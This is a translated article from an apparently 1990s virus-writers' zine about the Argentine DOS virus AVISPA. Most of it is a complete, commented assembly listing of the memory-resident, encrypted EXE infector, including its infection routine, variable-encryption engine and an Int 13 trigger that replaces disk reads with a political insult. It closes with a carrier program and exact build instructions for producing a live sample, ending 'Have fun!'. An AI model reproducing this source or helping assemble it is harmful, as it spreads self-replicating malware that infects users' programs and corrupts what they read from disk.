National Production #1 : Avispa...
-----------------------------------------------------------------

     This is a new section dedicated exclusively to those viruses
produced in Argentina.  Today's virus is AVISPA, written by Elijah
Bailey.  

    It has been called polymorphic.  This is not altogether the
case since, more than "polymorphing" the decryption routine, it
changes some bytes at random.  More than polymorphism, it is
variable encryption.

(TRANSLATOR'S NOTE:  The previous paragraph is a direct  
translation (I double checked the original).  I'm not certain what
the author meant, since as far as I know polymorphism IS variable
encryption.  Then again, what the hell do I know?)  :)
  
     The virus infects EXEs in the traditional manner, and it's
memory resident.  The way it goes resident is both simple and
obvious, since it simple makes use of the DOS call (see the article
on residence methods in this issue, by Zarathustra).  Also, it's
not too well written: there's a piece of dead code in it and there
are some "data" it never uses.  As if this weren't enough, the
implementation of the infection routine is pretty poor, since it
opens and closes the file it's infecting 3 or 4 times.  A little
planning and organization couls have avoided this.

     In spite of this, the virus does have a point in it's favor. 
We're talking about its "self-recognition" routine.  While other
encrypted viruses recognize previously infected files by "marking"
the date/time stamp, thus becoming visible to TBAV and other
inconveniences, this virus implements a simple but VERY original
checksumming method.  Definitely a ground breaking idea  :-).


% The Trigger %

     The virus has a non-destructive trigger.  If you try to read
from disk (Int 13), aproximately every hour the virus will
overwrite what has been read with text that insults Menem. 
(Obviously it overwrites it in memory; it's not destructive.)

     Simply put, it intercepts Int 13 and if you attempt to read
from disk any track greater than 10, and the least significant word
of the BIOS variable which stores the "ticks since midnight" is
zero, (which happens approximately once per hour), the virus first
performs a normal read of the desired sector, then overwrites it
with the insulting text in memory.


% Polymorphism %

     This virus cannot really be said to be polymorphic.  It simply
varies the decryption routine by changing some bytes at random.


     First, when setting up the decryption registers, the virus
varies the MOV instructions.  For example, the virus stores the
base address in BX during encryption.  So that the MOV which sets
BX is not always the same, the virus calculates a number at random,
subtracts it from what it has to move to BX and modifies the code. 
Let's take a look...

     MOV BX, 0900   =    MOV BX, 0800   =    MOV BX, F600
     ADD BX, 0000        ADD BX, 0100        ADD BX, 1300

     Did you get it?  The virus does this with BX (address), CX
(Encryption Key) and AX (compares to exit the loop).  Another way
to vary the virus is to change the order of some of the
instructions.  For example, the virus needs to increment BX by 2
each time it goes through the loop.  It does this in 4 distinct
ways, which it interchanges with each infection:

     INC BX    =>        INC BX     =>  NOP     =>     ADD BX, 2
     INC BX         NOP       INC BX
     NOP            INC BX         INC BX

     On the other hand, these 3 bytes are always in fixed
positions.

     The last method to vary the routines has to do with "garbage"
instructions.  There is no random number of trash instructions,
rather ther are certain predefined, 2 byte "places" in the code
where the trash instructions can be interchanged.  And thus, for
example, where formerly there was a PUSH AX/POP AX, we now have a
MOV DL, DL.

     All this effectively helps to vary the decryption routine, but
it still leaves some fixed bytes and what's worse, they're in fixed
positions.  This makes it possible (for the A/Vs) to define a
string whcih can be added to any antivirus product, using
wildcards.  This is enough proof, in my opinion, to state the
virus's polymorphism is not so hot.


     Anyhow, regardless of what technical critiques may be made of
this virus, no one can deny that it's pretty well dispersed in the
wild.  This give's it sufficient merit to be included here, quite
apart from its merit in being Argentina's first "polymorphic"
virus.  Remember, National Production!

                                        Trurl


%The Virus Itself%
; --------------------- AVISPA : Cut Here -------------------------
avispa         segment byte public
; Disassembled by Trurl for Minotaur Magazine #2.
     assume cs:avispa, ds:avispa, es:avispa, ss:avispa
     .186
     org 100h
; Virus: Avispa
; Type: Resident, Parasitic, EXE infector, Encrypted
; Size: 2048(+15) bytes.
; Origin: Argentina
Start:
; What you see below is the decryption routine.  It varies from   
; infection to infection by a few bytes, since the virus makes    
; all the changes.
     MOV  BX,0
     PUSH CX
     POP  CX
     ADD  BL,0
     PUSH DX
     POP  DX
Decrypt:
     MOV  AX,cs:[BX]
     PUSH DX
     POP  DX
     MOV  CX,0
     PUSH DX
     POP  DX
     SUB  CL,0
     PUSH SI
     POP  SI
     NOP
     XOR  AX,CX
     PUSH SI
     POP  SI
     MOV  cs:[BX],AX
     PUSH SI
     POP  SI
     INC  BX
     NOP
     INC  BX
     PUSH SI
     POP  SI
     MOV  AX,0
     PUSH DI
     POP  DI
     ADD  AX,0
     PUSH DI
     POP  DI
     NOP
     CMP  BX,AX
     PUSH DI
     POP  DI
     JB   Decrypt
     NOP
VirBegin:
     JMP  StartVir
; Data
     fHandler  dw   0 ; Handle of the file to be infected
     OldEntryPoint  dd   0 ; CS:IP of the EXE header
     OldStackPtr    dd   0 ; SS:SP of the EXE header
     ErrorVar  db   0      ; Error Flag (1 ==> Error)
     ; The following line is a waste of 4 bytes
               db   0,0,0,0 ; al pedo 1 (to fart 1?)
     OldInt21  dd   0       ; Pointer to the original Int 21 ISR.
     NamePtr        dd   0  ; File pointer at call 4B INT 21.
     OldInt24  dd   0       ; Pointer to the original Int 24 ISR
     ; This is already half assed(?)
               db   0,0,0,0 ; al pedo 2  (to fart 2?)
     OldInt13  dd   0 ; Pointer to the original INT 13 ISR
     ReadBuffer     db   34h dup(?) ; Read buffer (used by the    
                                    ; virus for self-recognition
     fAttr          dw   0 ; Attribute of the file to be infected.
     fTimeDate dd   0 ; Time & Date of the file 
     BytePara  db   0 ; Number of bytes remaining to complete the 
                      ; paragraph.
     ShitByte  db   0 ; Garbage bytes to place at the end.
     MemBlock  dw   0 ; used during the infection.
     ; I'm beginning to suspect that the author used all these    
     ; zeros to get me off the track.
               db   0, 0 ; al pedo 3    (to fart 3?) 
     VirName   db   "__ Virus Avispa - Buenos Aires - Noviembre
1993 __"

;
.................................................................

; Installation section
; Control is returned to this point once the virus is decrypted.
StartVir:
     MOV  AX,4BFFh ; residence test
     INT  21h      ; self-defined
     CMP  AX,4BFEh
     JNZ  Install_Virus ; If not in memory => Install virus
                        ; It's in memory, run host.
     MOV  AX,word ptr cs:OldStackPtr+2
     MOV  BX,DS
     ADD  AX,10h
     ADD  AX,BX   ; Returns SS y SP to their original values
     MOV  SS,AX   ; (Exe header prior to infection).
     MOV  AX,word ptr cs:OldStackPtr
     MOV  SP,AX
     MOV  AX,cs:word ptr OldEntryPoint+2  ; of the CS:IP entry    
                                          ; point.
     MOV  BX,DS     ; Now jump to the original address
     ADD  AX,10h
     ADD  AX,BX
     PUSH AX
     MOV  AX,cs:word ptr OldEntryPoint
     PUSH AX
     RETF

; Not in memory
Install_Virus:
     PUSH DS   ; Its copying its own code, located at the end
     POP  ES   ; host program's memory block, to the 
     MOV  DI,100h   ; beginning of this block, so as to   
     PUSH CS   ; correctly become resident  through a normal
     POP  DS   ; DOS call.
     MOV  SI,100h   
     CLD       ; This causes it not to pass control to the host
     MOV  CX,800h ; turning control over to the CS:IP if it has
     REPZ      ; install itself.  To do so, it must run thru 4B.
     MOVSB
     PUSH ES   ; It now jumps to the code it's just copied
     PUSH  offset Branch_Address
     RETF
Branch_Address:
     PUSH CS   ; Modifies the memory block to put it in
     POP  DS   ; 90 paragraphs
     MOV  AH,4Ah    ; (2304 bytes)
     PUSH CS
     POP  ES
     MOV  BX,90h
     INT  21h

; Interrupt (hooks?) (hangs?) 
     MOV  AX,3521h  ; Obtain the Int 21 IVT entry
     INT  21h
     MOV  word ptr OldInt21,BX  ; and store it.
     MOV  word ptr OldInt21+2,ES
     MOV  AX,3513h  ; obtain Int 13
     INT  21h
     MOV  word ptr OldInt13,BX; and store it.
     MOV  word ptr OldInt13+2, ES
     MOV  AX,2521h  ; hook int 21
     MOV  DX,offset NewInt21
     INT  21h
     MOV  AX,2513h  ; hook int 13
     MOV  DX,offset NewInt13
     INT  21h

     MOV  ES,word ptr ds:[2Ch]
     MOV  BX,0
GetName:
     MOV  AX,es:[BX]
     CMP  AX,0
     JZ   GotName
     INC  BX
     CMP  BX,12Ch
     JNZ  GetName
     ;JMP KeepRes ; Gotta HARD CODE this jump!!
aux_1:    db 0e9h
     dw offset KeepRes-3-offset aux_1

; Data zone. Used to call the original program.
DataForRun:
     dw    ?   ; Environment Segment
     dw       0080H
     dw    ?      ; Far pointer to Command Line
     dw    005CH
     dw    ?      ; Far pointer to FCB 1
     dw    006CH
     dw    ?      ; Far pointer to FCB 2
GotName:
     ADD  BX,4
     MOV  DX,BX
     MOV  word ptr DataForRun,ES
     MOV  word ptr DataForRun+4,CS
     MOV  word ptr DataForRun+8,CS
     MOV  word ptr DataForRun+12,CS
     MOV  BX,offset DataForRun
     PUSH ES
     POP  DS
     PUSH CS
     POP  ES
     MOV  AX,4B00h
     PUSH CS
     POP  SS
     MOV  SP,900h
     PUSHF
     CALL dword ptr cs:OldInt21
     PUSH DS
     POP  ES
     MOV  AH,49h
     INT  21h
; Goes resident by way of INT21 AH=31. with 90 paragraphs
KeepRes:
     MOV  AH,31h
     MOV  DX,90h
     INT  21h
; The following code is an absolute waste of 4 bytes.
; Perhaps Elijah didn't know that AH=31 INT 21 doesn't return     
; control :-)
; (just teasing you, Elijah, hehe)
     MOV  AH,4Ch
     INT  21h

;.................................................................

; Resident Routines

NewInt21:
     CMP  AX,4BFFh
     JNZ  GoOn
     DEC  AX        ; residence test
     IRET
; not a residence test.
GoOn:
     CMP  AX,4B00h  ; Is it a Run Program function?
     JZ   RunProgramFunc
     JMP  dword ptr cs:OldInt21 ; no => original INT 21.

RunProgramFunc:
     PUSHA
     PUSH ES
     PUSH DS
     MOV  cs:word ptr NamePtr+2,DS ; store ds and
     MOV  cs:word ptr NamePtr,DX   ; dx in memory
cuidadosamente.
     CALL Infect              ; call infection routine.
     POP  DS
     POP  ES
     POPA
     JMP  dword ptr cs:OldInt21    ; Original INT 21.

Infect:
     CALL CheckName ; Check the name
     PUSH CS
     POP  DS
     CMP  AH,0      ; If name = OK, infect.
     JZ   NameIsOk
     MOV  AH,1      ; If the file name ends with
     RET            ; AN, LD, OT, an, ld, ot, don't infect

NameIsOk:
     MOV  AH,3Dh         ; Open the file r/w
     MOV  AL,2
     MOV  DX,word ptr NamePtr
     MOV  DS,cs:word ptr NamePtr+2
     PUSHF
     CALL dword ptr cs:OldInt21
     JB   ErrorAndGetOut ; If error, => Exit
     PUSH CS
     POP  DS
     MOV  fHandler,AX    ; Store the handle
     MOV  BX,AX

     MOV  AH,3Fh         ; read 7f bytes to offset 80.
     MOV  CX,7Fh         ; (cs:80+80h =  cs:ff, je je)
     MOV  DX,80h
     PUSHF
     CALL dword ptr cs:OldInt21

     MOV  AH,3Eh
     MOV  BX,fHandler
     PUSHF
     CALL dword ptr cs:OldInt21    ; close file.

     CMP  WORD PTR ds:[80h],5A4Dh  ; If not an EXE, don't infect
     JNZ  ErrorAndGetOut
     CMP  WORD PTR ds:[94h],0 ; If CS or IP=0, AH=1 and 
     JNZ  ProceedInfect                 ; don't infect.
     CMP  WORD PTR ds:[96h],0 ; else, infect. (335)
     JZ   ErrorAndGetOut
     ;JMP ProceedInfect    ; Another JMP which must be hard coded
aux_2:    db 0e9h
     dw offset ProceedInfect-offset aux_2-3

ErrorAndGetOut:
     MOV  AH,1
     RET

ProceedInfect:
     PUSH CS
     POP  DS
     MOV  AH,3Dh              ; reopen the file
     MOV  AL,2
     MOV  DX,word ptr NamePtr
     MOV  DS,word ptr cs:NamePtr+2
     PUSHF
     CALL dword ptr cs:OldInt21

     JB   ErrorAndGetOut      ; If no error => Exit with error
     PUSH CS
     POP  DS
     MOV  fHandler,AX         ; Store the new handle
     MOV  AX,4202h       ; Move pointer to end of file
     MOV  BX,fHandler         
     MOV  DX,0
     MOV  CX,0
     INT  21h
     CMP  AX,34h              ; If ax>= 34h ==> dx
     JB   DecDx               ; If ax<34h ==> dx--;
     ;JMP Sub34               ; Another hard coded JMP
aux_3:    db 0e9h
     dw offset Sub34-offset aux_3-3
DecDx:
     DEC  DX
Sub34:
     SUB  AX,34h       ; Subtract 34h from file size.
     MOV  CX,DX
     MOV  DX,AX
     MOV  AX,4200h
     MOV  BX,fHandler  ; Moves the pointer 34h bytes ahead
     INT  21h       ; of the end of file

     MOV  AH,3Fh         ; reads 34h bytes to a buffer
     MOV  BX,fHandler
     MOV  CX,34h
     MOV  DX,offset ReadBuffer
     INT  21h

     MOV  AH,3Eh         ; Close the file.
     MOV  BX,fHandler
     INT  21h

     MOV  BX,offset ReadBuffer ; This portion of the code is for
     MOV  CX,[BX]             ; self recognition.
     ADD  BX,2           ; While other encrypted and polymorphic
     MOV  DX,0           ; viruses recognize themselves by 
LoopChecksum:                 ; manipulating the date/time stamp  
   MOV  AX,[BX]             ; this one implements a type of
     XOR  AX,CX               ; checksum. Very nice.
     ADD  DX,AX
     INC  BX
     INC  BX
     CMP  BX,offset ReadBuffer+34h
     JNZ  LoopChecksum
     CMP  DX,7DDAh
     JNZ  NotInfected    ; If not infected ==> NotInfected
GetOut:
     JMP  ErrorAndGetOut      ; If already infected, Exit
NotInfected:
     MOV  AX,3524h       ; Stores the old vector and captures
     INT  21h            ; the Critical error handler Int to a 
     MOV  word ptr OldInt24,BX     ; 'dummy' routine
     MOV  word ptr OldInt24+2,ES
     MOV  AX,2524h
     MOV  DX,offset NewInt24  ; dummy error handler
     INT  21h

     MOV  AH,43h              ; Obtain file attributes.
     MOV  AL,0
     MOV  DX,word ptr NamePtr
     MOV  DS,cs:word ptr NamePtr+2
     INT  21h

     PUSH CS
     POP  DS
     MOV  BYTE PTR ErrorVar,0 ; pZoroes the error variable.
     MOV  fAttr,CX       ; stores the attribute

     MOV  AH,43h              ; Sets the file attribute to 0,
     MOV  AL,1           ; over writing the Read/Only flag
     MOV  DX,word ptr NamePtr 
     MOV  CX,0
     MOV  DS,cs:word ptr NamePtr+2
     INT  21h
     ; JMP     Skip1 ; That's how many hard coded JMPS...?  What  
 aux_4:    db 0e9h   ; the fuck is this guy using to assemble this?
     dw offset Skip1-offset aux_4-3
NearGetOut:
     JMP  GetOut
Skip1:
     PUSH CS
     POP  DS
     MOV  AX,2524h       ; Returns the original value to
     MOV  DX,word ptr OldInt24     ; the INT 24 vector
     MOV  DS,cs:word ptr OldInt24+2
     INT  21h

     PUSH CS
     POP  DS
     CMP  BYTE PTR ErrorVar,1 ; Looks for the error flag.
     JZ   GetOut              ; if it's there, exit

; si no hubo error, sigue aqui
     MOV  AH,3Dh              ; Reopens file (3rd time!) in 
     MOV  AL,2           ; read/write mode
     MOV  DX,word ptr NamePtr
     MOV  DS,cs:word ptr NamePtr+2
     PUSHF
     CALL dword ptr cs:OldInt21

     JB   NearGetOut          ; If error, exit
     PUSH CS
     POP  DS
     MOV  fHandler,AX         ; Store the handle

     MOV  AH,57h              ; Obtain old time&date stamp
     MOV  AL,00               
     MOV  BX,fHandler
     INT  21h
     MOV  word ptr fTimeDate,DX    ;and stores it
     MOV  word ptr fTimeDate+2,CX
     MOV  BYTE PTR BytePara,0 ; clears the paragraph byte count 

RoundToPara:
     MOV  AX,4202h       ; move pointer to end of file
     MOV  BX,fHandler
     MOV  CX,0
     MOV  DX,0
     INT  21h
     CMP  CX,0fh
     JA   NearGetOut2

     MOV  BX,10h              ; Checks to see if it ends in a     
     DIV  BX                  ; paragraph
     CMP  DX,0
     JZ   RoundedUp      ; If yes,  => RoundedUp

     MOV  AH,40h              ; If not, writes a "shitbyte" and
     MOV  BX,fHandler         ; starts all over again
     MOV  CX,1           
     MOV  DX,offset ShitByte
     INT  21h
     MOV  AH,BytePara         ; increments number of bytes neede  
     INC  AH             ; for the paragraph.
     MOV  BytePara,AH
     JMP  RoundToPara

; If when we check file size, CX = 15 returns
NearGetOut2:
     PUSH CS
     POP  DS
     MOV  AH,3Eh                   ; Close the file
     MOV  BX,fHandler
     INT  21h
     MOV  AH,1                ; and return an error
     RET

; Here we round out the EOF to a paragraph.
; The EXE header is at offset 80.
RoundedUp:
     SUB  AX,10h         ; ax had the number of file paragraphs
file.

     MOV  CX,ds:[84h]    ; Modifies the number of 512 byte pages
     ADD  CX,4      ; of the EXE header
     MOV  ds:[84h],CX
     SUB  AX,ds:[88h]    ; (subtracts the header size
     MOV  CX,ds:[94h]    ; Stores the variables in the old entry
point.
     MOV  word ptr OldEntryPoint,CX
     MOV  CX,ds:[96h]
     MOV  word ptr OldEntryPoint+2,CX
     MOV  CX,ds:[8Eh]    ; Idem el viejo SS:SP
     MOV  word ptr OldStackPtr+2,CX
     MOV  CX,ds:[90h]
     MOV  word ptr OldStackPtr,CX

     MOV  ds:[96h],AX         ; Modifies the header CS
     MOV  ds:[8Eh],AX         ; Modifies the header SS
     MOV  WORD PTR ds:[90h],900h  ; Sets SP and IP to constant
     MOV  WORD PTR ds:[94h],100h  ; values
     MOV  AX,ds:[82h]
     SUB  BX,BX
     MOV  BL,BytePara
     ADD  AX,BX
     MOV  ds:[82h],AX         ; Modifies the remainder
     MOV  AH,48h
     MOV  BX,90h              ; asks for a second 90 paragraph
     INT  21h            ; memory block
     JB   NearGetOut2         ; if error => exit
     MOV  cs:word ptr MemBlock,AX  ; stores the second block.
     MOV  ES,MemBlock
     MOV  DI,100h
     MOV  SI,100h
     CLD
     MOV  CX,800H   ;?         ; the block is copied.
     REPZ
     MOVSB

     CALL VariableEncryption  ; Varies the next copy of the virus.
     PUSH CS
     POP  DS
     MOV  BX,fHandler         ; writes at end of file the copy
     MOV  CX,800H             ; of the other block
     MOV  AH,40h
     MOV  DX,100h
     MOV  DS,cs:MemBlock
     INT  21h
     PUSH CS
     POP  DS
     MOV  AH,42h              ; goes to start of the file
     MOV  AL,0
     MOV  BX,fHandler
     MOV  CX,0
     MOV  DX,0
     INT  21h
     MOV  AH,40h              ; writes the modified header
     MOV  BX,fHandler
     MOV  CX,1Eh
     MOV  DX,80h
     INT  21h

     PUSH CS
     POP  DS
     MOV  AH,57h              ; restores the old time and date
     MOV  AL,1           ; stamp
     MOV  CX,word ptr fTimeDate+2
     MOV  DX,word ptr fTimeDate
     MOV  BX,fHandler
     INT  21h
     MOV  AH,3Eh              ; closes the file
     MOV  BX,fHandler
     INT  21h
     MOV  AH,43h              ; replaces the old attributes
     MOV  AL,1
     MOV  CX,fAttr
     MOV  DX,word ptr NamePtr
     MOV  DS,cs:word ptr NamePtr+2
     INT  21h
     PUSH CS
     POP  DS
     MOV  AH,49h              ; frees the memory block
     MOV  ES,MemBlock
     INT  21h
     MOV  AH,0
     RET                 ; exit

     CryptKey       dw   0; Encryption variable
GarbageInstruccions:
; This "garbage code" is used to vary the decryption routine during
; encryption.
     MOV  AH,AH
     MOV  BH,BH
     MOV  CH,CH
     MOV  DH,DH
     MOV  AL,AL
     MOV  BL,BL
     MOV  CL,CL
     MOV  DL,DL
     PUSH AX
     POP  AX
     PUSH BX
     POP  BX
     PUSH CX
     POP  CX
     PUSH DX
     POP  DX
     PUSH SI
     POP  SI
     PUSH DI
     POP  DI
     PUSH ES
     POP  ES
     PUSH DS
     POP  DS
     MOV  CL,CL

VariableEncryption:
; It calls BEFORE writing the code to the second memory block.
; As can be seen, it's not polymorphism, just "variable encryption"

     MOV  DS,cs:MemBlock ; moves the second block of the virus    
                         ; to DS
     PUSH AX
     MOV  AX,0040h
     MOV  ES,AX
     POP  AX
     XOR  DX,DX               ; reads the least significant byte
     MOV  DL,es:[6Ch]         ; of the ticks since midnight
     MOV  CX,offset VirBegin  ; subtracts 314 (13a) from that.
     SUB  CL,DL
     MOV  word ptr Start+1,CX ; stroes the rest in MOV order
     MOV  WORD PTR Start+5,0C380h ; sets "add bl, "
     MOV  byte ptr Start+7,DL ; and DL in "add" order
     MOV  DX,es:[6Ch]         ; in DX, adds to the ticks 
     ADD  DX,CS:MemBlock      ; the block segment
     MOV  CS:CryptKey,DX      ; and stores it.  To the least 
     MOV  CX,ES:[6Ch]         ; significant word (of the ticks) it
     ADD  CX,ES:[6Eh]         ; adds the greatest significant word
     MOV  CH,0           ; All this just to get a more-or-less 
     ADD  DL,CL               ; random value .
     MOV  word ptr Start+10h,DX   ; and stores it.
     MOV  byte ptr Start+16h,CL
     MOV  AX,CX

     ; Para Randomizar el XOR AX, CX | NOP
     JPE  IsEven
     MOV  WORD PTR Start+19h,0C133h  ; if not even =>
     MOV  BYTE PTR Start+1bh,90h     ; xor ax, cx | nop
     ; JMP     IsOdd ; Incredible! Is he assembling in A86?   
                     ; Golly!!
aux_5:    db 0e9h
     dw offset IsOdd-offset aux_5-3
IsEven:
     MOV  BYTE PTR Start+19h,90h     ; if even =>
     MOV  WORD PTR Start+1ah,0C133h  ; nop | xor ax, cx

     ; "Randomization Zone" for ADD BX, 2
IsOdd:
     CMP  WORD PTR Start+23h,4343h ; inc bx | inc bx | nop?
     JZ   IsIncIncNop
     CMP  WORD PTR Start+24h,4343h ; nop | inc bx | inc bx?
     JZ   IsNopIncInc
     CMP  WORD PTR Start+23h,0C383h ; add bx, ?
     JZ   IsAdd
     MOV  WORD PTR Start+23h,4343h ; inc bx | nop | inc bx =>
     MOV  BYTE PTR Start+25h,90h   ; INC BX | INC BX | NOP
     JMP     Skip2Next ; This is getting to be a real pain!
aux_6:    db 0e9h
     dw offset Skip2Next-offset aux_6-3
IsIncIncNop:
     MOV  BYTE PTR Start+23h,90h   ; inc bx | inc bx | nop
     MOV  WORD PTR Start+24h,4343h ; NOP | INC BX | INC BX
     JMP     Skip2Next ; I'm getting tired of this shit!
aux_7:    db 0e9h
     dw offset Skip2Next-offset aux_7-3
IsNopIncInc:
     MOV  WORD PTR Start+23h,0C383h ; nop | inc bx | inc bx
     MOV  BYTE PTR Start+25h,2          ; SUB AX, 2
     JMP     Skip2Next ; I don't have to tell you my balls are    
                       ; hanging to the ground with these JMPs
aux_8:    db 0e9h
     dw offset Skip2Next-offset aux_8-3
IsAdd:
     MOV  BYTE PTR Start+23h,43h   ; add bx, ?
     MOV  BYTE PTR Start+24h,90h   ; INC BX | NOP | INC BX
     MOV  BYTE PTR Start+25h,43h

     ; "Randomizing Zone" for  mov ax, end
Skip2Next:
     MOV  CX,8CCh ; total length
     MOV  DX,es:[6Dh]
     SUB  CX,DX
     MOV  word ptr Start+29h,CX
     MOV  word ptr Start+2eh,DX
     MOV  AX,DX
     ; Randomizing zone for cmp bx, ax | nop
     JPE  IsEven2
     MOV  WORD PTR Start+32h,0C339h
     MOV  BYTE PTR Start+34h,90h
     JMP     DoneCmpNop ; If I ever get my hands on the author of 
                        ; A86 I'll castrate him!
aux_9:    db 0e9h
     dw offset DoneCmpNop-offset aux_9-3
IsEven2:
     MOV  BYTE PTR Start+32h,90h
     MOV  WORD PTR Start+33h,0C339h
     ; Area used to aggregate "trash" instructions
DoneCmpNop:
     MOV  CX,0Bh
     MOV  BX,offset Start+3
AddTrash:
     XOR  DX,DX          ; This section of the code changes the
     XOR  AX,AX          ; garbage instructions in the encryption
     MOV  AL,es:[6Ch]    ; routine.
     ADD  AL,BL
     MOV  DL,10h
     DIV  DL
     ADD  AL,AL
     MOV  AH,00
     MOV  SI,offset GarbageInstruccions
     ADD  SI,AX
     MOV  DX,cs:[SI]
     MOV  [BX],DX
     ADD  BX,5
     LOOP AddTrash

     ; This section encrypts the code itself.
     PUSH CS
     POP  DS
     MOV  ES,MemBlock    ; ES <= VIRUS SEGMENT
     MOV  BX,offset VirBegin; BX <= BASE ADRESS
     MOV  CX,CryptKey    ; CX <= ENCRYPTION KEY
EncryptIt:
     MOV  AX,ES:[BX]
     XOR  AX,CX
     MOV  ES:[BX],AX
     INC  BX
     INC  BX
     CMP  BX,8CCh
     JB   EncryptIt

     ; This area is used to put trash at the end of the virus
     PUSH CS
     POP  DS
     MOV  DI,8CEh
     MOV  ES,MemBlock
     MOV  SI,offset VirName
     CLD
     MOV  CX,32h
     REPZ
     MOVSB
     PUSH AX
     MOV  AX,40h
     MOV  ES,AX
     POP  AX
     MOV  CX,es:[6Ch]
     MOV  ES,cs:MemBlock
     MOV  es:[8CCh],CX
     MOV  BX,8CEh
TooMuchShit:
     MOV  AX,es:[BX]
     XOR  AX,CX
     MOV  es:[BX],AX
     INC  BX
     INC  BX
     CMP  BX,900h
     JB   TooMuchShit
     RET

CheckName: ; Compares against the name give in DS:DX
; If the last 2 letters are AN, LD, OT, or an, ld, ot,  
; returns AH=1 else AH=0
     MOV  BX,DX
GetPoint:
     CMP  BYTE PTR [BX],2Eh        ; looks for the pointer
     JZ   GotPoint
     INC  BX
     JMP  GetPoint
GotPoint:
     CMP  WORD PTR [BX-2],4E41h; Last 2 letters are AN
     JZ   BadName
     CMP  WORD PTR [BX-2],6E61h; Last 2 letters are an
     JZ      BadName
     CMP  WORD PTR [BX-2],444Ch; Last 2 letters are LD
     JZ      BadName
     CMP  WORD PTR [BX-2],646Ch; Last 2 letters are ld
     JZ      BadName
     CMP  WORD PTR [BX-2],544Fh; Last 2 letters are OT
     JZ      BadName
     CMP  WORD PTR [BX-2],746Fh; Last 2 letters are ot
     JZ      BadName
     MOV  AH,0
     RET
BadName:
     MOV  AH,1
     RET

NewInt24: ; errorhandler
; Dummy routine for int 24.
; Except it sets a variable to 1.
     MOV  BYTE PTR cs:ErrorVar,1
     IRET

NewInt13:
; Rutina reemplazo int 13.
     CMP  AH,2           ; Is this for a "read"?
     JZ   ReadFunc
BackToInt13:
     JMP  dword ptr CS:OldInt13    ; Else, call int 13
original.
; es para lectura
ReadFunc:
     CMP  CH,0Ah         ; If number of track<10=int 13 orig.
     JB   BackToInt13
; This is the trigger ...
     PUSH ES
     PUSH AX
     PUSH AX
     MOV  AX,40h         ; Sets the BIOS variable in
     MOV  ES,AX          ; 40:6C = Timer ticks since midnight
     POP  AX        ; Its a DWORD.
     MOV  AX,es:[6Ch]
     CMP  AX,0
     JZ   ItsZero        ; If Zero: => 75a
     POP  AX
     POP  ES
     JMP  BackToInt13    ; If != 0, original Int 13.
ItsZero:
     POP  AX
     POP  ES
     PUSHF

     CALL dword ptr cs:OldInt13; Calls original Int 13 with 
     JB   ReadError ; Original values. Error => exit

     PUSHA
     PUSH ES
     PUSH DS
     PUSH CS
     POP  DS
     MOV  DI,BX          ; Overwrites what's been read with the
     MOV  SI,offset Text ; text seen below.
     MOV  CX,200h
     CLD
     REPZ
     MOVSB
     POP  DS
     POP  ES
     POPA
ReadError:
     IRET

     ; Replacing text (see last comment).
Text db "$$ Virus AVISPA $$ Republica Argentina$$ Elijah Baley "
     db "$$ Noviembre 10 de 1993 "
     db "$$ This program is not an old virus variant, and it was
written "
     db "in Argentina by Elijah Baley. It uses polymorphic technics
to"
     db " avoid conventional scanning."
     db "$$ MENEM: Libertador de torturadores y asesinos de
inocentes, que"
     db " Dios se apiade de tu pobre alma. $$ 64446"
ends avispa
end Start
; --------------------- AVISPA : Cut Here ------------------------

 The carrier
; -------------------- Fake Host : Cut Here ----------------------
hoste          segment byte public
     assume cs:hoste, ds:hoste, es:hoste, ss:hoste
     org 100h
FakeHoste:
     mov ax, 4bffh
     int 21h
     cmp ax, 4bfeh
     jnz InstallIt
     mov ax, 4c00h
     int 21h
InstallIt:
     mov ax, cs
     add ax, 80h
     mov ss, ax
     mov sp, 0
     push ax
     push 100h
     retf
EndHoste:
     db  800h-(offset EndHoste-offset FakeHoste) DUP('a');
ends
end FakeHoste
; -------------------- Fake Host : Cut Here -----------------------

NOTES ON THE SOURCE CODE.
     The source listed above has a byte-to-byte correspondence to
AVISPA in its "natural state".  It can be seen that the author used
A86 or some such animal to assemble it, since some of the jumps
which could have been SHORT (EB, 2 bytes) are NEAR (E9, 3 bytes). 
TASM was making them SHORT, so, inorder to maintain a one-to-one
correspondence, I had to "force" them.  Besides, in the assembled
file some bytes are diferent due to some instructions having two
possible machine codes:

                 TASM 3.1  AVISPA ORIGINAL
     ADD AX, BX     03C3       01D8
     ADD DX, AX     03D0       01C2
     ADD SI, AX     03F0       01C6
     ADD DL, CL     02D1       00CA
     ADD AL, BL     02C3       00D8
     SUB CL, DL     2ACA       28D1
     MOV SP, AX     8BE0       89C4
     MOV AX, CX     8BC1       89C8
     MOV BX, DX     8BDA       89D3
     MOV DI, BX     8BFB       89DF
     MOV AH, AH     8AE4       88E4
     MOV ??, ??      8A??        88??
     MOV DL, DL     8AD2       88D2

ASSEMBLY INSTRUCTIONS:
     To assemble the virus, copy the AVISPA source to AVISPA.ASM
and the Fake Host source to HOST.ASM then do the following:


     TASM /M5 AVISPA
     TLINK /T AVISPA
     TASM /M5 HOSTE
     TLINK /T HOSTE
     COPY /B HOSTE.COM+AVISPA.COM TMP
     DEL AVISPA.COM
     REN TMP AVISPA.COM
     This will leave you with an AVISPA.COM which is the AVISPA
     carrier.

     Have fun!
                              Trurl, the great constructor
 
